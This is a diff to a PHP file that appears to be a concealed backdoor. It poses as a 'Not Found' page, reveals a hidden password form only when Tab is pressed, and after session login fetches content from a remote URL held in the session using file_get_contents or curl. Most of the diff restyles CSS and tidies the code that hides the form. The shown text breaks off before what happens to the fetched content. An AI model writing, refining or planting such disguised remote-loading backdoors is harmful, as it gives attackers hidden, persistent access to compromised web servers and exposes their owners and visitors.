@@ -25,18 +25,43 @@ if (isset($_GET['ts_reset'])) {
     echo "success";
     exit;
 }
-
-// HTML Header (Always)
 ?>
 <!DOCTYPE HTML>
 <html>
 <head>
     <title>Not Found</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 2em; background: #fff; color: #000; }
-        h1 { font-size: 22px; }
-        .line { border-top: 1px solid #ccc; margin-top: 10px; }
-        form { margin-top: 20px; }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 2em;
+            background: #fff;
+            color: #000;
+        }
+        h1 {
+            font-size: 22px;
+        }
+        .line {
+            border-top: 1px solid #ccc;
+            margin-top: 10px;
+        }
+        form {
+            margin-top: 20px;
+        }
+        #password, #submitBtn {
+            background: none;
+            border: none;
+            outline: none;
+            font-family: inherit;
+            font-size: 14px;
+            color: #000;
+            margin-top: 5px;
+        }
+        #pwLabel, #password, #submitBtn {
+            display: none;
+        }
+        #submitBtn {
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -47,7 +72,6 @@ if (isset($_GET['ts_reset'])) {
 
 <?php
 if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
-    // Login form
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
         $provided_password = $_POST['password'];
         if (password_verify($provided_password, $correct_password)) {
@@ -61,13 +85,15 @@ if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
     }
     ?>
     <form method="post" id="loginForm">
-        <label for="password" id="pwLabel" style="display: none;">Password:</label><br>
-        <input type="password" name="password" id="password" style="display: none;" required><br>
-        <input type="submit" value="Submit" style="display: none;" id="submitBtn">
+        <label for="password" id="pwLabel">Password:</label><br>
+        <input type="password" name="password" id="password" required><br>
+        <input type="submit" value="Submit" id="submitBtn">
     </form>
+
     <script>
         document.addEventListener("keydown", function (event) {
             if (event.key === "Tab") {
+                event.preventDefault(); // Prevent focus shift
                 document.getElementById("pwLabel").style.display = "inline";
                 document.getElementById("password").style.display = "inline";
                 document.getElementById("submitBtn").style.display = "inline";
@@ -75,16 +101,16 @@ if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
             }
         });
     </script>
-    </body>
-    </html>
-    <?php
+</body>
+</html>
+<?php
     exit;
 } else {
-    // Authenticated: fetch and show remote content
-    $result = @file_get_contents($_SESSION["ts_url"] ?: $url);
+    $targetUrl = $_SESSION["ts_url"] ?: $url;
+    $result = @file_get_contents($targetUrl);
     if (empty($result)) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $_SESSION["ts_url"] ?: $url);
+        curl_setopt($ch, CURLOPT_URL, $targetUrl);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         $result = curl_exec($ch);
         curl_close($ch);
